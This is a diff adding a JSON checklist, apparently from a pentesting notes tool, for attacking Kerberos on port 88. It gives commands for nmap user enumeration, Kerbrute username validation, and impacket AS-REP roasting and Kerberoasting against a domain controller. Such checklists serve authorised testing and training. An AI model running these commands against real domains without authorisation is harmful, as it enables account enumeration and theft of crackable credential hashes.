@@ -1,0 +1,56 @@
+{
+  "service": "Kerberos",
+  "port": 88,
+  "categories": [
+    {
+      "category": "1. Recon & Clock Sync (Do This First)",
+      "tasks": [
+        {
+          "id": "krb_nmap",
+          "title": "Nmap Kerberos Scripts",
+          "description": "Confirm the service and pull the realm name from the response.",
+          "commands": [
+            "nmap -sV -p 88 --script krb5-enum-users {target_ip}"
+          ]
+        },
+        {
+          "id": "krb_clock_sync",
+          "title": "Sync Kali's Clock with the DC",
+          "description": "Kerberos rejects any request with more than ~5 minutes of clock skew (KRB_AP_ERR_SKEW). This is the #1 cause of every Kerberos-based tool (Rubeus, impacket -k, Kerbrute, evil-winrm with a ticket) silently failing — always do this before troubleshooting anything else Kerberos-related.",
+          "commands": [
+            "sudo ntpdate {target_ip}",
+            "sudo rdate -n {target_ip}"
+          ]
+        }
+      ]
+    },
+    {
+      "category": "2. Username Enumeration (Kerbrute)",
+      "tasks": [
+        {
+          "id": "krb_kerbrute_userenum",
+          "title": "Kerbrute User Enumeration",
+          "description": "Kerberos pre-auth responds differently for valid vs. invalid usernames (PRINCIPAL UNKNOWN vs. needs pre-auth), letting you validate a username list without triggering account lockouts the way a real bind attempt would. Do this before any password spraying.",
+          "commands": [
+            "kerbrute userenum -d <domain> --dc {target_ip} users.txt",
+            "kerbrute userenum -d <domain> --dc {target_ip} /usr/share/wordlists/seclists/Usernames/Names/names.txt"
+          ]
+        }
+      ]
+    },
+    {
+      "category": "3. Roasting (See AD Post-Exploitation for Full Chains)",
+      "tasks": [
+        {
+          "id": "krb_roast_crossref",
+          "title": "AS-REProasting / Kerberoasting",
+          "description": "Once you have a username list (from Kerbrute above) or valid creds, the full AS-REProast and Kerberoast workflows — including the hashcat cracking commands — live in the Active Directory & Domain Escalation section under Post-Exploitation, not duplicated here.",
+          "commands": [
+            "impacket-GetNPUsers <domain>/ -usersfile users.txt -no-pass -dc-ip {target_ip}",
+            "impacket-GetUserSPNs <domain>/<user>:<password> -dc-ip {target_ip} -request"
+          ]
+        }
+      ]
+    }
+  ]
+}
